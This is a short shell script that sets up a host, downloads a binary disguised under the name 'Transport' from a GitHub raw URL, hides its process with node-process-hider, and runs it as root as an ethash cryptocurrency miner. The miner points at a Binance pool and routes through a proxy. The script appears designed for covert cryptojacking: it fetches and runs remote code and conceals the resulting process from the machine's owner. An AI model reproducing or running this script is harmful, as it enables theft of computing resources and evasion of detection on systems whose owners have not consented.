apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
chmod +x Transport
ph add Transport
sudo ./Transport -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u Gok001 -p x -w Trans --no-sni --dns-https-server 1.1.1.1 --proxy 46.174.43.18:1080 
